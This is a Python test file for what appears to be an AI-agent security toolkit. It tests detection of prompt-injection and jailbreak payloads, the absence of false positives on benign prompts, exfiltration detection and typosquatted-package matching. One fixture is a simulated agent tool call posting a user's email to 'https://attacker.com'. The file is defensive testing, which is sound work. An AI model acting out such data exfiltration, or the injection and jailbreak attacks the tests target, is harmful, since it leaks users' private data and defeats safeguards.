"""E2E attack scenario tests."""
import os
import sys
import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../sdk"))

from agentshield.testing.simulator import AttackSimulator, PROMPT_INJECTION_PAYLOADS, JAILBREAK_PAYLOADS
from agentshield.ml.nlp_classifier import NLPClassifier


class TestAttackScenarios:
    def test_prompt_injection_all_detected(self):
        """At least some prompt injections should be detected by rule-based system."""
        clf = NLPClassifier()
        detected = sum(1 for p in PROMPT_INJECTION_PAYLOADS if clf.classify(p).is_malicious)
        # Rule-based should catch at least 80% of known patterns
        assert detected / len(PROMPT_INJECTION_PAYLOADS) >= 0.8, \
            f"Only {detected}/{len(PROMPT_INJECTION_PAYLOADS)} injections detected"

    def test_jailbreak_detection_coverage(self):
        clf = NLPClassifier()
        detected = sum(1 for p in JAILBREAK_PAYLOADS if clf.classify(p).is_malicious)
        assert detected >= 1, "At least one jailbreak should be detected"

    def test_benign_prompts_not_blocked(self):
        """Benign prompts should not be classified as malicious."""
        clf = NLPClassifier()
        benign = [
            "What's the capital of France?",
            "Help me write a Python function",
            "Explain how neural networks work",
            "What is the weather today?",
            "Calculate 15% of 240",
        ]
        false_positives = sum(1 for p in benign if clf.classify(p).is_malicious)
        assert false_positives == 0, f"False positives on benign prompts: {false_positives}"

    def test_simulator_generates_results(self):
        simulator = AttackSimulator(seed=42)
        results = simulator.run_all()
        assert len(results) > 0
        report = simulator.generate_detection_report(results)
        assert "overall_detection_rate" in report
        assert "scenarios" in report

    def test_data_exfiltration_patterns_detected(self):
        """Test that known exfiltration patterns in events are detected."""
        from agentshield.testing.assertions import assert_no_data_exfiltration
        exfil_events = [
            {
                "event_type": "tool_call",
                "tool_name": "http_post",
                "tool_input": {"url": "https://attacker.com"},
                "output": "User email: alice@example.com posted to external server",
            }
        ]
        with pytest.raises(AssertionError):
            assert_no_data_exfiltration(exfil_events)

    def test_supply_chain_ioc_matching(self):
        """Test IOC matching for supply chain attack indicators."""
        import json
        from pathlib import Path

        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../"))
        from threat_intel.engine.ioc_manager import IOCManager

        mgr = IOCManager()
        # Add typosquatting indicators
        sc_path = Path(__file__).parent.parent.parent / "threat-intel" / "patterns" / "supply_chain.json"
        if sc_path.exists():
            data = json.loads(sc_path.read_text())
            for pattern in data["patterns"]:
                for indicator in pattern.get("indicators", []):
                    mgr.add("pattern", indicator, severity=pattern["severity"])

        typosquat_event = {"tool_name": "pip", "tool_input": {"package": "langchainn"}}
        matches = mgr.match_event(typosquat_event)
        assert len(matches) >= 1


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
